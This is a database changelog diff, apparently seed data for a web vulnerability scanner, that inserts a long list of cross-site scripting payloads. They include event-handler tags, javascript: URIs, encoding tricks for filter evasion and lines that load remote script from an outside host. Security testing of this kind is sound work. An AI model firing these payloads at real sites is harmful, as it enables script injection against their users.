@@ -1,0 +1,557 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<databaseChangeLog
+        xmlns="http://www.liquibase.org/xml/ns/dbchangelog/1.9"
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog/1.9
+                      http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-1.9.xsd">
+
+    <changeSet author="user" id="005">
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<image/src/onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<img/src/onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<<image src/onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<img src/onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<image src =q onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<img src =q onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<</scrip</script>t><img src =q onerror=prompt(8)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<svg onload=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '</script><svg onload=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onblur=alert(1)>lose focus!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onclick=alert(1)>click this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x oncopy=alert(1)>copy this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x oncontextmenu=alert(1)>right click this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x oncut=alert(1)>copy this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x ondblclick=alert(1)>double click this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x ondrag=alert(1)>drag this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onfocus=alert(1)>focus this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable oninput=alert(1)>input here!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onkeydown=alert(1)>press any key!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onkeypress=alert(1)>press any key!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onkeyup=alert(1)>press any key!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onmousedown=alert(1)>click this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onmousemove=alert(1)>hover this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onmouseout=alert(1)>hover this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onmouseover=alert(1)>hover this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onmouseup=alert(1)>click this!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x contenteditable onpaste=alert(1)>paste here!');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script>alert(1)//');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script>alert(1)<!–');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script src=//brutelogic.com.br/1.js>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script src=//3334957647/1>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '%3Cx onxxx=alert(1)');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<%78 onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x %6Fnxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x o%6Exxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x on%78xx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onxxx%3D1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<X onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x%09onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x%0Aonxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x%0Conxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x%0Donxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x%2Fonxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '&lt;x 1=&quot;1&quot;onxxx=&quot;1&quot;&gt;');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x 1="1"onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x </onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x 1=">" onxxx=1');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<http://onxxx%3D1/');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<x onxxx=alert(1) 1=''''>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '*/alert(1)</script><script>/*');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script>alert(1)</script>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script src=javascript:alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<iframe src=javascript:alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<embed src=javascript:alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<<math><brute href=javascript:alert(1)>click');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<form action=javascript:alert(1)><input type=submit>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<isindex action=javascript:alert(1) type=submit value=click>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<form><button formaction=javascript:alert(1)>click');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<form><input formaction=javascript:alert(1) type=submit value=click>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<form><input formaction=javascript:alert(1) type=image value=click>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<form><input formaction=javascript:alert(1) type=image src=SOURCE>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<isindex formaction=javascript:alert(1) type=submit value=click>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<object data=javascript:alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<svg><script xlink:href=data:,alert(1) />');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<math><brute xlink:href=javascript:alert(1)>click');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, 'from=javascript:alert(1) to=&>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<html ontouchstart=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<html ontouchend=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<html ontouchmove=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<html ontouchcancel=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<body onorientationchange=alert(1)>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, 'GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script src="data:&comma;alert(1)//');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<script src="//brutelogic.com.br&sol;1.js&num;');
+            ]]>
+        </sql>
+
+        <sql>
+            <![CDATA[
+            INSERT INTO attack_script(attack_id, severity_id, attack_script)
+            VALUES (2, 2, '<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;');
+            ]]>
+        </sql>
+
+    </changeSet>
+</databaseChangeLog>
